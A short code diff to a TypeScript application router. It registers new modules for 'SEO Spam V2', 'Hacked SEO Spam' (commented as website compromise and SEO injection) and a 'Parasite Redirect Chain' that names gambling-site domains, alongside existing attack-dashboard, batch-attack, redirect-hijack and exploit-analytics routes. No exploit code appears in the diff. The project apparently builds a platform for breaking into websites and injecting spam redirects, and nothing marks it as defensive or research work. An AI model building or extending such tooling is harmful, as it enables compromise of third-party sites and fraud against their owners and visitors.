@@ -69,6 +69,9 @@ import { wpThemesRouter } from "./routers/wp-themes";
 import { attackDashboardRouter } from "./routers/attack-dashboard";
 import { batchAttackRouter } from "./routers/batch-attack";
 import { hijackRedirectRouter } from "./routers/hijack-redirect";
+import { seoSpamV2Router } from "./routers/seo-spam-v2";
+import { hackedSeoSpamRouter } from "./routers/hacked-seo-spam";
+import { parasiteRedirectChainRouter } from "./routers/parasite-redirect-chain";
 
 export const appRouter = router({
   system: systemRouter,
@@ -242,6 +245,15 @@ export const appRouter = router({
   batchAttack: batchAttackRouter,
   // Hijack Redirect Engine (takeover existing redirects)
   hijackRedirect: hijackRedirectRouter,
+
+  // SEO Spam V2 — AI-Powered Advanced SEO Attack System
+  seoSpamV2: seoSpamV2Router,
+
+  // Hacked SEO Spam — Advanced Website Compromise & SEO Injection
+  hackedSeoSpam: hackedSeoSpamRouter,
+
+  // Parasite Redirect Chain (middlemanbar.com → t.ly → pgbet888x.com style)
+  parasiteRedirectChain: parasiteRedirectChainRouter,
 
   // Exploit Analytics & Success Rate Tracking
   exploitAnalytics: router({
